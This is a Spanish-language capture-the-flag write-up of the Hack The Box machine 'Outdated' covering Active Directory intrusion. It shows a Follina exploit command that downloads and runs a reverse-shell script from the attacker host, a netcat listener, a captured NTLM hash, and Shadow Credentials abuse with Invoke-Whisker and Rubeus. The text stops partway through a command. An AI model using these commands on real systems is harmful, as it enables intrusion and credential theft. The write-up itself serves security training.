---
layout: post
title: OutDated
date: 2022-12-31
description:
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Outdated-htb/Outdated_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración del SMB

* Explotación con Follina

* Enumeración con Bloodhound

* Abuso del Privilegio AddKeyCredentialLink

* Abuso del Grupo WSUS Administrators

***

# Reconocimiento

## Escaneo de puertos con *nmap*

### Descubrimiento de puertos abiertos

```null
sudo nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.11.175
[sudo] password for rubbx: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 21:05 GMT
Initiating SYN Stealth Scan at 21:05
Scanning 10.10.11.175 [65535 ports]
Discovered open port 25/tcp on 10.10.11.175
Discovered open port 139/tcp on 10.10.11.175
Discovered open port 135/tcp on 10.10.11.175
Discovered open port 53/tcp on 10.10.11.175
Discovered open port 445/tcp on 10.10.11.175
Discovered open port 8530/tcp on 10.10.11.175
Discovered open port 3269/tcp on 10.10.11.175
Discovered open port 9389/tcp on 10.10.11.175
Discovered open port 49689/tcp on 10.10.11.175
Discovered open port 49685/tcp on 10.10.11.175
Discovered open port 49926/tcp on 10.10.11.175
Discovered open port 49686/tcp on 10.10.11.175
Discovered open port 88/tcp on 10.10.11.175
Discovered open port 8531/tcp on 10.10.11.175
Discovered open port 636/tcp on 10.10.11.175
Discovered open port 49667/tcp on 10.10.11.175
Discovered open port 464/tcp on 10.10.11.175
Discovered open port 49933/tcp on 10.10.11.175
Discovered open port 389/tcp on 10.10.11.175
Discovered open port 3268/tcp on 10.10.11.175
Discovered open port 593/tcp on 10.10.11.175
Discovered open port 5985/tcp on 10.10.11.175
Discovered open port 49906/tcp on 10.10.11.175
Increasing send delay for 10.10.11.175 from 0 to 5 due to 13 out of 43 dropped probes since last increase.
Completed SYN Stealth Scan at 21:06, 54.52s elapsed (65535 total ports)
Nmap scan report for 10.10.11.175
Host is up, received user-set (0.25s latency).
Scanned at 2023-01-05 21:05:14 GMT for 54s
Not shown: 65512 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
25/tcp    open  smtp             syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
8530/tcp  open  unknown          syn-ack ttl 127
8531/tcp  open  unknown          syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49685/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49906/tcp open  unknown          syn-ack ttl 127
49926/tcp open  unknown          syn-ack ttl 127
49933/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.62 seconds
           Raw packets sent: 262109 (11.533MB) | Rcvd: 55 (2.420KB)
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49685,49686,49689,49906,49926,49933 10.10.11.175 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 21:19 GMT
Nmap scan report for 10.10.11.175
Host is up (0.30s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-06 04:19:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-01-06T04:20:53+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-01-06T04:20:51+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2023-01-06T04:20:53+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2023-01-06T04:20:51+00:00; +6h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
8531/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49906/tcp open  msrpc         Microsoft Windows RPC
49926/tcp open  msrpc         Microsoft Windows RPC
49933/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2023-01-06T04:20:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.14 seconds
```

# Dominios

Añado el dominio outdated.htb al /etc/hosts


Con la herramienta dig efectuo un ataque de transferencia de zona (axfr), así como nameservers y servidores de correo, para extraer otros posibles subdominios

```null
dig @10.10.11.175 outdated.htb axfr

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.11.175 outdated.htb axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
```null
dig @10.10.11.175 outdated.htb mx

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.11.175 outdated.htb mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42518
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;outdated.htb.			IN	MX

;; AUTHORITY SECTION:
outdated.htb.		3600	IN	SOA	dc.outdated.htb. hostmaster.outdated.htb. 230 900 600 86400 3600

;; Query time: 99 msec
;; SERVER: 10.10.11.175#53(10.10.11.175) (UDP)
;; WHEN: Thu Jan 05 21:33:21 GMT 2023
;; MSG SIZE  rcvd: 91
```
```null
dig @10.10.11.175 outdated.htb ns

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.11.175 outdated.htb ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18636
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 5

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;outdated.htb.			IN	NS

;; ANSWER SECTION:
outdated.htb.		3600	IN	NS	dc.outdated.htb.
```

Añado los nuevos dominios al /etc/hosts

#### SMB (Puerto 445)

Con crackmapexec aplico un reconocimiento por SMB

```null
crackmapexec smb 10.10.11.175
SMB         10.10.11.175    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
```

Con smbmap, enumero los recursos compartidos a nivel de red

```null
smbmap -H 10.10.11.175 -u 'null'
[+] Guest session   	IP: 10.10.11.175:445	Name: outdated.htb                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Shares                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	UpdateServicesPackages                            	NO ACCESS	A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
	WsusContent                                       	NO ACCESS	A network share to be used by Local Publishing to place published content on this WSUS system.
	WSUSTemp                                          	NO ACCESS	A network share used by Local Publishing from a Remote WSUS Console Instance.
```

Tengo acceso con capacidad de lectura en *IPC$* y *Shares*

Enumerando *Shares*:

```null
smbmap -H 10.10.11.175 -u 'null' -r 'Shares'
[+] Guest session   	IP: 10.10.11.175:445	Name: outdated.htb                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Shares                                            	READ ONLY	
	.\Shares\*
	dr--r--r--                0 Mon Jun 20 15:01:33 2022	.
	dr--r--r--                0 Mon Jun 20 15:01:33 2022	..
	fw--w--w--           106977 Mon Jun 20 15:00:33 2022	NOC_Reminder.pdf
```

Hay un PDF que puedo tratar de descargar

```null
smbmap -H 10.10.11.175 -u 'null' --download 'Shares/NOC_Reminder.pdf'
mv 10.10.11.175-Shares_NOC_Reminder.pdf NOC_Reminder.pdf
```
Abriendolo con libreoffice se puede observar que tiene el siguiente contenido:
```null
libreoffice NOC_Reminder.pdf
```

<img src="/writeups/assets/img/Outdated-htb/1.png" alt="">

En el PDF pone que espera un link que va a ser abierto para guardarlo en una plataforma de alertas y notificaciones

En paralelo, enumero por kerberos posibles usuarios válidos a nivel de sistema con un ataque de fuerza bruta

```null
kerbrute userenum --dc 10.10.11.175 -d outdated.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/05/23 - Ronnie Flathers @ropnop

2023/01/05 21:50:51 >  Using KDC(s):
2023/01/05 21:50:51 >  	10.10.11.175:88

2023/01/05 21:50:57 >  [+] VALID USERNAME:	guest@outdated.htb
2023/01/05 21:51:11 >  [+] VALID USERNAME:	administrator@outdated.htb
2023/01/05 21:53:34 >  [+] VALID USERNAME:	Guest@outdated.htb
2023/01/05 21:53:35 >  [+] VALID USERNAME:	Administrator@outdated.htb
2023/01/05 21:53:45 >  [+] VALID USERNAME:	client@outdated.htb
2023/01/05 22:02:04 >  [+] VALID USERNAME:	GUEST@outdated.htb
```
Como ningún usuario es ASP-RepRoasteable, no ha servido de nada la enumeración

A través del puerto 25 (snmp), envio un link con swaks para validar que es cierto y visualizar el User Agent

```null
swaks --to itsupport@outdated.htb --from rubbx@rubbx.com --body "http://10.10.14.2/" --header "Subject: Internal web app"
=== Trying outdated.htb:25...
=== Connected to outdated.htb.
<-  220 mail.outdated.htb ESMTP
 -> EHLO localhost
<-  250-mail.outdated.htb
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<rubbx@rubbx.com>
<-  250 OK
 -> RCPT TO:<itsupport@outdated.htb>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Thu, 05 Jan 2023 22:05:19 +0000
 -> To: itsupport@outdated.htb
 -> From: rubbx@rubbx.com
 -> Subject: Internal web app
 -> Message-Id: <20230105220519.023507@localhost>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> http://10.10.14.2/
 -> 
 -> 
 -> .
<-  250 Queued (11.203 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

En el PDF mencionaban un CVE, el cual hace referencia a Follina, una vulnerabilidad reciente que afectó a Microsoft Office
Existen varios exploits en Github, así que voy a probarlo

```null
git clone https://github.com/chvancooten/follina.py

```

La sintaxis para utilizar esta herramienta es la siguiente:

```null
python3 follina.py -m command -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:8080/Invoke-ConPtyShell.ps1')" -t rtf
Generated 'clickme.rtf' in current directory
Generated 'exploit.html' in 'www' directory
Serving payload on http://localhost:80/exploit.html
```

Esto genera un fichero en formato de texto enriquecido que en caso de que se interprete permitirá ejecutar comandos en powershell

Por tanto, si descargo ese html y lo comparto con un servicio http, cuando el usuario haga click en el link se ejecutará el exploit

```null
wget http://localhost/exploit.html
mv exploit.html index.html
python3 -m http.server 80
```

Desde el directorio /opt/nishang/Shells/ monto otro servidor por el puerto 8080 para hostear el Invoke-ConPtyShell.ps1

```null
cd /opt/nishang/Shells
python3 -m http.server 8080
```

Modifico ConPtyShell, añadiendo una línea al final, para que la Shell llegue a mi equipo, así como las filas y columnas

<img src="/writeups/assets/img/Outdated-htb/2.png" alt="">

En otra ventana me pongo en escucha por el puerto 443 y recivo la Shell

```null
nc -nlvp 443
PS C:\Users\btables\AppData\Local\Temp\SDIAG_b958471e-cc88-4078-ba3f-1c5962d69a35>
```

Se puede observar que estoy en un contenedor y que el hostname no coincide con el de la máquina target

```null
PS C:\> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.20.20 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.20.1

PS C:\> hostname
client
```

Para aplicar pivoting, lo más optimo es enumerar posibles formas de escalar privilegios con BloodHound

Para ello, hay que subir un injestor y descargar los datos al equipo local

Con impacket-smbserver comparto el SharpHound.exe

```null
smbserver.py shared /opt -smb2support
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.175,49868)
[*] AUTHENTICATE_MESSAGE (OUTDATED\btables,CLIENT)
[*] User CLIENT\btables authenticated successfully
[*] btables::OUTDATED:aaaaaaaaaaaaaaaa:b8b87d9796ae7f0bdc9f757d435d154e:0101000000000000807f0023912ad901d27e444b00ca208e0000000001001000480067007300550066006900740065000300100048006700730055006600690074006500020010004c005900660052005900610044007a00040010004c005900660052005900610044007a0007000800807f0023912ad901060004000200000008003000300000000000000000000000002000000cf12c5a6aeff35eaacb25eaa44900199edbafe0a21f0a0973a82a099ba316f00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found SharpHound.exe
[-] SMB2_TREE_CONNECT not found SharpHound.exe
[*] Disconnecting Share(1:IPC$)
```

Se puede observar un hash Net-NTLMv2, pero la contraseña es robusta y no se puede crackear

Desde el contenedor copio el binario

```null
PS C:\> mkdir Temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/17/2023   3:32 PM                Temp


PS C:\> cd Temp
PS C:\Temp> copy \\10.10.14.2\shared\SharpHound.exe SharpHound.exe
PS C:\Temp> dir


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/28/2022   5:49 AM         908288 SharpHound.exe
```

Al ejecutar añado el argumento -c para que sea lo más agresivo posible

```null
PS C:\Temp> .\SharpHound.exe -c All
2023-01-17T15:35:10.2521779-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-17T15:35:10.7829203-08:00|INFORMATION|Initializing SharpHound at 3:35 PM on 1/17/2023
2023-01-17T15:35:21.2516478-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-17T15:35:23.5204173-08:00|INFORMATION|Beginning LDAP search for outdated.htb
2023-01-17T15:35:23.9443638-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-01-17T15:35:23.9704499-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-01-17T15:35:53.7992990-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2023-01-17T15:36:10.0345292-08:00|INFORMATION|Consumers finished, closing output channel
2023-01-17T15:36:10.6018232-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-01-17T15:36:12.3722217-08:00|INFORMATION|Status: 97 objects finished (+97 2.020833)/s -- Using 60 MB RAM
2023-01-17T15:36:12.3878674-08:00|INFORMATION|Enumeration finished in 00:00:48.8672276
2023-01-17T15:36:12.8618512-08:00|INFORMATION|SharpHound Enumeration Completed at 3:36 PM on 1/17/2023! Happy Graphing!
PS C:\Temp> 
```

Copio el zip a mi equipo

```null
PS C:\Temp> copy .\20230117153605_BloodHound.zip \\10.10.14.2\shared\bh.zip
```

Abro BloodHound y subo los datos

```null
sudo neo4j console
bloodhound
```

Una vez cargados los datos, busco el usuario Btables y lo marco como pwneado

Destaca lo siguiente:

<img src="/writeups/assets/img/Outdated-htb/3.png" alt="">

El usuario Btables es miembro del grupo ITStaff y Sflowers tiene el privilegio AddKeyCredentialLink sobre ese grupo y además puede obtener una consola interactiva sobre el DC.

En el panel de ayuda se puede ver en consiste ese grupo

<img src="/writeups/assets/img/Outdated-htb/4.png" alt="">

Para abusar de ello voy a utilizar Invoke-Whisker

Lo descargo y lo importo en la máquina

```null
wget https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Whisker.ps1
python3 -m http.server 80
```

```null
PS C:\Temp> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/Invoke-Whisker.ps1')
```

Al ejecutarlo, devuelve el siguiente output:

```null
PS C:\Temp> Invoke-Whisker -Command "add /target:sflowers"         
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password LyqIj3z2DRpHGRAT
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 2d277db0-628a-47b0-bca7-662c003a4743
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAjkWJyENM76XQICB9AEggTYTzE
zwmg3y2zvmSB8V1zMM+YmhzwZIVFcKjLyJkh1xDm72LmsvSxDxyH9OGGd82b7MDZ9afWjqTaLuBWpdglh8rO5oBDmxtmBPnEPR64+9ZvWM/AR035ghLOxmO5tufYj53CKEKuzAj7GtjjLrAz/TMn/0j66fjawQilHZgv0cFLrtxttulbzgpWRl56c5NMcuObzyHpX1FBLlzHrOykI
xZ8xHWLzx9xC/jwBzn+g3qmKISNHgmSXTTQshIT5KV8wDSHxZPHNC6WvvJqxsjCQpolPDPZbaHmTRrhFYOFo5+HqS0PF3NYuyN9h5B/msZKQIySNvhvtjUZpC/5vfoWq47ymWJz25B2/Y4tOPBF9N8o/0maq+8sI+LLv2uhdhe8GdWm6CMEmMXopr3bhe2zqlHz1yedk03f9gVO4M
sYabfWAxGsm7n6Wg0O6EXiU6E+UerKdsmNKLwJ3pd7b33emjtpFwPIptWSuKQFyCSnO46hp/8mF3oy3/BJ4+LMG28kWIYbyncjHeoowvh/xf5ZPNqOyJfVJPtPeEnPTGiFt+EQI1JXL0xGBed9CO/nEmU7dNtrOtaPizK403Al+o0R7HiW/ftpe92dXHkM5vCoQbRipUE5zpZZMTi
C5VjrszMk8uk/sRPr7tsBehYQt2RpjOrpkIj2ns49VGiFCwZ9LiM7nHworZddhShPipQtnBWym7smzzX6L6qTCwHwWEJVdlMknwFnMybLxN/ja5rXbDrRTF/LlNZXkFD6hbPhseL0wKjTzK7Zeg8J/KyZwa46/ykXENiwiJuGGbR06jPoSyQMVU6CHlangqscKct8Qo2M+GYI007e
Z3bKg/fNQgLRK0tzfCfRzWyPKfSUSp6IyHW55AY9vtQkU8HgYHnNPGDP6gFWE3PwF/jMsq+nqZiRL8gJcoOT66JSKhEQQBYiKP+0wN9deS6johN6b/Azm7/sa91WdW8sxRuz11r+KHMh08Ml881s5DuxhUtol7LCv6lpM5yoph/0m/1/wjRmH7Y+bT+gaFo6Eo9NPnfMeFaH4DUfz
clYfIdjyWQWUP2LSf1lzi+RiM3C2ieOHT6uknR05DDIW5P4ZfCV9lnA4p3QXa+8PKd2tCpFs9fRuBb8bMM32j7Z7glkceBx4TTQc7ZKOcy1wZNGl5FCPEFvKjmxIN9lcyDIRVxqGzFLScS9nkHuFQrfQmnvbOwqXQAbkEiKuIg/R7C5Rs9I+LY3IXvdOO12kB/YlCMz5eFCgE7Tw3
lsCAQEm1WAnSRtDx1bDPa6cimH/p9Fc8sHLtG8MathANxRor8ZIV+EYrTTFp+Z1pIKnEWZw1mx19wXlk89hKHdmDdnnnfWYC01SjwnETzDbEs6ElEeEHz1lz+HpHGZ9+wsQd2pbvHW9bkEpve19oKppcONAtpJXoxD2fq+Sdabq8+6QBdFmIteokrx055DWpOJp/ZRMzuIGujCrji
ry3CdiEJS++Cgv8sD5d1/it2LoDCzzSDD1fvr+lYdlQpRid4v7g7hedjVwbtuL2xfY6enB+ABl2mM+DRHSPUpASoZ9sUpuQZhzzaP3O6FHDCFA4oC1/g/jOxsf0lk0MY1XS+JNYQWQhlyxbTU9Eq6nWc5R+oHH+RWqD8SaMKHyZM9Qfx8N6LMLVZWcQjGB6TATBgkqhkiG9w0BCRU
xBgQEAQAAADBXBgkqhkiG9w0BCRQxSh5IADUAZQA3ADkAYgBlADEAYwAtADYANwA3ADMALQA0ADUAMgBiAC0AYgA2ADcAMAAtAGQAMgBhADMAOQA3ADgAYwBmADMANgA0MHkGCSsGAQQBgjcRATFsHmoATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMA
QQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByMIIDPwYJKoZIhvcNAQcGoIIDMDCCAywCAQAwggMlBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAiwL3QxtGYx0wICB9CAggL4gwUYu7ko7L9e1TopG2/vBtBWn
+vXD3eB7XdbLtQctO8NqCN0Mfm6vKiUSp/GkbMBlE4uYzERoQfNjBFIc5cMGJM84lXS7+eRwpu+JMdRT6TU9cwpkv0yKUiUK3UtBaLY4i4aPvA/Y+9EBcVCnFhvlBfH+2OJHMbtbpX/RkvxBk0IfRbzjkocxciXyeSq+CS5xZ81ZwWfkX2B3sK06yXZaUM0ak2mQeum+sB2mu5dS7
MyeGimYk5NpfOF/BhIW4Gx8uWKS1wz5NO6xJnz00Arc1lS9+DXQD+1aOHfAgCJzxzde9OhMAocp1RMRwZZi0/PosO+O8eUhnnTVL3jPWoJvu7xfmaG6YS9tfmtfdHXRk2GuwcpvY7qhMuPuwsLBCT1DBuSFWZ2FrSYz2oJiZ4tmV1cnCL0OD/p/GvHa8kJzwYVedLgAVB4yx/X9Di
AiaprEVTHYg0GvVx0o6fkhzxoltQ3cVckdLEqSMtnABk3LbxCk68K8yWb8lLZq+9NQcUiMvDplDENVOhkuA8qk5SOBWuIsHZojVkt4RE1B5EorseE4RrEwZ6B7RfymvbwDYc59VhXy/vErCsAoka2zdH00zG6d/9nAYhMf/PtvAjxNC/RrB6gDnAQ5qoi9gmSN92OHYDvXWRVoaRs
CVc4fhAl9dg/5tSZQoiP2w83GMZieI/igLXGjP7i5G1lEe2fsIAhrCs31bC9Kf561lNwPFKuE/OMb4DdkktWUoCfJx//WCHNabo3cC+zPDjZhktnlRLvYEbfJ34GNqf7jreYii1YnPCGcwYZ5RglMtsl/ZP4tVx28zn4Gd8VMet/NQc91xMypYcL1FX2K/tIzMZ28OlvreBy+P6z8
MzMBYCSRyxQAuXCBtQc8YlCetTmV7b/7nNkd794ePQhRqSf1FDU7A/T5EgerxBEh6sS9ceguhISfbV5kAlshFGvpX6CqT5EyLbpZn3Gd0jsH0x8Jp9fAY1px4yPvIChz3uucA9lk6IHXilwBetSXqPkVDA7MB8wBwYFKw4DAhoEFPkrB6ntGJfAi/a1bYFK81iYA0reBBTdtrNjyS
iJi3pk0oLO7U+BaY5Z0AICB9A= /password:"LyqIj3z2DRpHGRAT" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
```

El propio script te da el comando que tengo que ejecutar con Rubeus para obtener un hash NTLM y poder hacer PassTheHash

Subo el Rubeus a la máquina de la misma forma que el SharpHound

Ejecuto el Rubeus

```null
PS C:\Temp> .\Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAjkWJyENM76X
QICB9AEggTYTzEzwmg3y2zvmSB8V1zMM+YmhzwZIVFcKjLyJkh1xDm72LmsvSxDxyH9OGGd82b7MDZ9afWjqTaLuBWpdglh8rO5oBDmxtmBPnEPR64+9ZvWM/AR035ghLOxmO5tufYj53CKEKuzAj7GtjjLrAz/TMn/0j66fjawQilHZgv0cFLrtxttulbzgpWRl56c5NMcuObzyH
pX1FBLlzHrOykIxZ8xHWLzx9xC/jwBzn+g3qmKISNHgmSXTTQshIT5KV8wDSHxZPHNC6WvvJqxsjCQpolPDPZbaHmTRrhFYOFo5+HqS0PF3NYuyN9h5B/msZKQIySNvhvtjUZpC/5vfoWq47ymWJz25B2/Y4tOPBF9N8o/0maq+8sI+LLv2uhdhe8GdWm6CMEmMXopr3bhe2zqlHz
1yedk03f9gVO4MsYabfWAxGsm7n6Wg0O6EXiU6E+UerKdsmNKLwJ3pd7b33emjtpFwPIptWSuKQFyCSnO46hp/8mF3oy3/BJ4+LMG28kWIYbyncjHeoowvh/xf5ZPNqOyJfVJPtPeEnPTGiFt+EQI1JXL0xGBed9CO/nEmU7dNtrOtaPizK403Al+o0R7HiW/ftpe92dXHkM5vCoQ
bRipUE5zpZZMTiC5VjrszMk8uk/sRPr7tsBehYQt2RpjOrpkIj2ns49VGiFCwZ9LiM7nHworZddhShPipQtnBWym7smzzX6L6qTCwHwWEJVdlMknwFnMybLxN/ja5rXbDrRTF/LlNZXkFD6hbPhseL0wKjTzK7Zeg8J/KyZwa46/ykXENiwiJuGGbR06jPoSyQMVU6CHlangqscKc
t8Qo2M+GYI007eZ3bKg/fNQgLRK0tzfCfRzWyPKfSUSp6IyHW55AY9vtQkU8HgYHnNPGDP6gFWE3PwF/jMsq+nqZiRL8gJcoOT66JSKhEQQBYiKP+0wN9deS6johN6b/Azm7/sa91WdW8sxRuz11r+KHMh08Ml881s5DuxhUtol7LCv6lpM5yoph/0m/1/wjRmH7Y+bT+gaFo6Eo9
NPnfMeFaH4DUfzclYfIdjyWQWUP2LSf1lzi+RiM3C2ieOHT6uknR05DDIW5P4ZfCV9lnA4p3QXa+8PKd2tCpFs9fRuBb8bMM32j7Z7glkceBx4TTQc7ZKOcy1wZNGl5FCPEFvKjmxIN9lcyDIRVxqGzFLScS9nkHuFQrfQmnvbOwqXQAbkEiKuIg/R7C5Rs9I+LY3IXvdOO12kB/Y
